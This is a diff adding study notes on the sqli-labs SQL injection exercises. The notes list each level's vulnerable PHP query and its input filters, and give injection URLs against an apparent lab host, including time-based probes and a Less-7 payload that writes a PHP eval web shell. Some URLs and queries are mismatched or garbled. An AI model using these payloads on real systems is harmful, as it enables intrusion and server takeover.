@@ -1,0 +1,170 @@
+
+	https://www.cnblogs.com/-qing-/p/11610385.html#lab1
+	
+	https://blog.csdn.net/qq_41420747/article/details/81836327
+	
+
+Page-1(Basic Challenges)
+	Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)
+		http://1.117.162.201/sqli/Less-1/?id=1' or 1=1 -- +
+		$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+		
+	Less-2 GET - Error based - Intiger based (基于错误的GET整型注入)
+		http://1.117.162.201/sqli/Less-2/?id=1 or 1=1 -- +
+		$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
+		
+	Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)
+		http://1.117.162.201/sqli/Less-3/?id=1') or 1=1 -- +
+		$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
+		
+	Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）
+		http://1.117.162.201/sqli/Less-4/?id=1) or 1=1 -- +
+		$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
+		
+	Less-5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)
+		http://1.117.162.201/sqli/Less-5/?id=1' and if(length(database())=8,sleep(5),1)--+
+		$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+		
+	Less-6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)
+		http://1.117.162.201/sqli/Less-5/?id=1" and if(length(database())=8,sleep(5),1)--+
+		$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
+		
+	Less-7 GET - Dump into outfile - String （导出文件GET字符型注入）
+		http://1.117.162.201/sqli/Less-7/?id=1')) union select 1,2,'<?php @eval($_post["xiao”])?>' into outfile "d:\\xiao\\1.php" -- +
+		$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";
+		
+	Less-8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)
+		http://1.117.162.201/sqli/Less-8/?id=1' or 1=1 -- +
+		$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1"; //print_r(mysql_error());
+		
+	Less-9 GET - Blind - Time based. -  Single Quotes  (基于时间的GET单引号盲注)
+		http://1.117.162.201/sqli/Less-8/?id=1' or 1=1 -- +
+		$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1"; //print_r(mysql_error());
+		
+	Less-10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)
+		http://1.117.162.201/sqli/Less-10/?id=1" or 1=1 -- +
+		$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
+		
+	Less-11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)
+		@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
+		
+	Less-12 POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)
+		@$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";
+		
+	Less-13 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)
+		@$sql="SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1";
+		
+	Less-14 POST - Double Injection - Single quotes-  String -twist (POST单引号变形双注入)
+		@$sql="SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1";
+		
+	less-15 POST - Blind- Boolian/time Based - Single quotes (基于bool型/时间延迟单引号POST型盲注)
+		@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"; //print_r(mysql_error());
+		
+	Less-16 POST - Blind- Boolian/Time Based - Double quotes (基于bool型/时间延迟的双引号POST型盲注)
+		@$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";
+		
+	Less-17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)
+		if(magic_quotes_gpc(stripslashes(ctype_digit(mysql_real_escape_string(intval($value))))))
+		@$sql="SELECT username, password FROM users WHERE username= $uname LIMIT 0,1";
+		
+	Less-18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)
+		$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
+		
+	Less-19 POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)
+		$insert="INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')";
+ 
+
+Page-2 (Advanced Injections)
+
+	Less-20 POST - Cookie injections - Uagent field  - Error based (基于错误的cookie头部POST注入)
+		$sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";
+		
+	Less-21 Cookie Injection- Error Based- complex - string ( 基于错误的复杂的字符型Cookie注入)
+		$cookee = base64_decode($cookee);
+		$sql="SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1";
+		
+	Less-22 Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)
+		$sql="SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1";
+		
+	Less-23 GET - Error based - strip comments (基于错误的，过滤注释的GET型)
+		$id = preg_replace("/#/","", $id);
+		$id = preg_replace("/--/","", $id);
+
+	Less - 24 Second Degree Injections  *Real treat* -Store Injections (二次注入)
+		$sql = "insert into users ( username, password) values(\"$username\", \"$pass\")";
+		$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
+		
+	Less-25 Trick with OR & AND (过滤了or和and)
+		$id= preg_replace('/or/i',"", $id);			
+		$id= preg_replace('/AND/i',"", $id);	
+		
+    Less-25a Trick with OR & AND Blind （过滤了or和and的盲注）
+		//print_r(mysql_error());
+		
+	less 26  Trick with comments and space (过滤了注释和空格的注入)
+		$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
+		$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
+		$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
+		$id= preg_replace('/[--]/',"", $id);		//Strip out --
+		$id= preg_replace('/[#]/',"", $id);			//Strip out #
+		$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
+		$id= preg_replace('/[\/\\\\]/',"", $id);		//Strip out slashes
+		
+	less 26a GET - Blind Based - All your SPACES and COMMENTS belong to us(过滤了空格和注释的盲注)
+		//print_r(mysql_error());
+		
+	less 27 GET - Error Based- All your UNION & SELECT belong to us （过滤了union和select的）
+		$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
+		$id= preg_replace('/[--]/',"", $id);		//Strip out --.
+		$id= preg_replace('/[#]/',"", $id);			//Strip out #.
+		$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
+		$id= preg_replace('/select/m',"", $id);	    //Strip out spaces.
+		$id= preg_replace('/[ +]/',"", $id);	    //Strip out spaces.
+		$id= preg_replace('/union/s',"", $id);	    //Strip out union
+		$id= preg_replace('/select/s',"", $id);	    //Strip out select
+		$id= preg_replace('/UNION/s',"", $id);	    //Strip out UNION
+		$id= preg_replace('/SELECT/s',"", $id);	    //Strip out SELECT
+		$id= preg_replace('/Union/s',"", $id);	    //Strip out Union
+		$id= preg_replace('/Select/s',"", $id);	    //Strip out select
+
+	less 28 GET - Error Based- All your UNION & SELECT belong to us String-Single quote with parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入
+		$id= preg_replace('/[\/\*]/',"", $id);				//strip out /*
+		$id= preg_replace('/[--]/',"", $id);				//Strip out --.
+		$id= preg_replace('/[#]/',"", $id);					//Strip out #.
+		$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
+		//$id= preg_replace('/select/m',"", $id);	   		//Strip out spaces.
+		$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.
+		$id= preg_replace('/union\s+select/i',"", $id);	    //Strip out UNION & SELECT.
+
+	Less-29 基于WAF的一个错误
+		$match = preg_match("/^\d+$/", $input);
+
+	Less-30 Get-Blind Havaing with WAF
+		//print_r(mysql_error());
+		
+	Less-31 Protection with WAF
+
+	Less-32 Bypass addslashes()
+		$string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //逃离任何反斜杠
+		$string = preg_replace('/\'/i', '\\\'', $string);                               //使用反斜杠逃脱单引用
+		$string = preg_replace('/\"/', "\\\"", $string);                                //使用反斜杠逃脱双重报价
+		
+	Less-33 Bypass addslashes()
+		for ($i=0; $i < strlen($string); $i++)
+			$hex .= dechex(ord($string[$i]));
+    
+	Less-34 Bypass Add SLASHES
+		$uname = addslashes($uname1);$passwd= addslashes($passwd1);
+		@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
+		 
+	Less-35 why care for addslashes()
+		$uname = addslashes($uname1);$passwd= addslashes($passwd1);
+		$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
+		
+		
+		
+		
+		
+		
+		
+		
